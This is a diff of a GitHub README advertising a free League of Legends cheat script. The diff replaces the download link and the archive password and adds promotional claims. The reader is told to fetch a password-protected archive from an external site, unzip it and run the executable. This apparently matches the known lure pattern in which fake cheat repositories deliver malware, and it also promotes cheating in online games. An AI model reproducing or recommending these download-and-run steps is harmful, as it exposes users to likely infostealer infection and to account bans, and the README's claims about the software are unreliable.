@@ -1,46 +1,65 @@
-# HYROCOPT-CHEAT-LEAGUE-OF-LEGENDS-HACK-SCRIPT
+# LEAGUE-OF-LEGENDS-HACK-SCRIPT-More
 
+# IMPORTANT 
 
-# Download
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
-|:-------------|
-Passwrod: 23
+# Be sure to create an account on GitHub before launching the cheat 
+# Without it, the cheat will not be able to contact the server
+
+-----------------------------------------------------------------------------------------------------------------------
+# Download Cheat
+|[Download](https://sites.google.com/view/nccrakc/main-page)|Password: 2077|
+|---|---|
+-----------------------------------------------------------------------------------------------------------------------
+
+# Why us?
+
+- We have a website with full player support
+
+- We are constantly updating cheats for the latest version of the game
+
+- We provide all CHEATS for FREE
+
+- Not any problems with the installation 
+
+- All cheats are connected into one launcher for convenience
+
+-----------------------------------------------------------------------------------------------------------------------
 
 # How to install?
 
-Download the archive
+- Visit our website
 
-Unzip the archive to your desktop ( Password from the archive is 23 )
+- Download the archive 
 
-Run the file ( HYROCPT HACK )
+- Unzip the archive to your desktop ( Password from the archive is 2077 )
 
-Launch the game
+- Run the file ( NcCrack )
 
-In-game INSERT button
+- Launch the game
+
+- In-game INSERT button
+
+-----------------------------------------------------------------------------------------------------------------------
 
 # SYSTEM REQUIREMENTS
-Processor | Intel | Amd Processor |
 
-Windows support | 7 | 8 | 8.1 | 10 | 11 |
+- Processor | Intel | Amd Processor |
 
-Build support | ALL |
+- Windows support | 7 | 8 | 8.1 | 10 | 11 |
+
+- Build support | ALL |
+
+-----------------------------------------------------------------------------------------------------------------------
 
 # Functional
 
-![изображение](https://user-images.githubusercontent.com/126882239/224451995-4eca36fd-63e0-4ec6-a694-ce1459b86ddf.png)
+- High quality Prediction
+- High quality Evade
+- High quality Orbwalker
+- High quality Target selector
+- Built-in Champion logic
+- Built-in Item and Summoner spell Activator
+- Skin hack
+- Zoom Hack
 
-High quality Prediction
-
-High quality Evade
-
-High quality Orbwalker
-
-High quality Target selector
-
-Built-in Champion logic
-
-Built-in Item and Summoner spell Activator
-
-Skin hack
-
-Zoom Hack
+![B5BENQZ](https://user-images.githubusercontent.com/122768704/214162853-ad5e568b-44dd-4d2a-a458-97e170e32695.jpg)
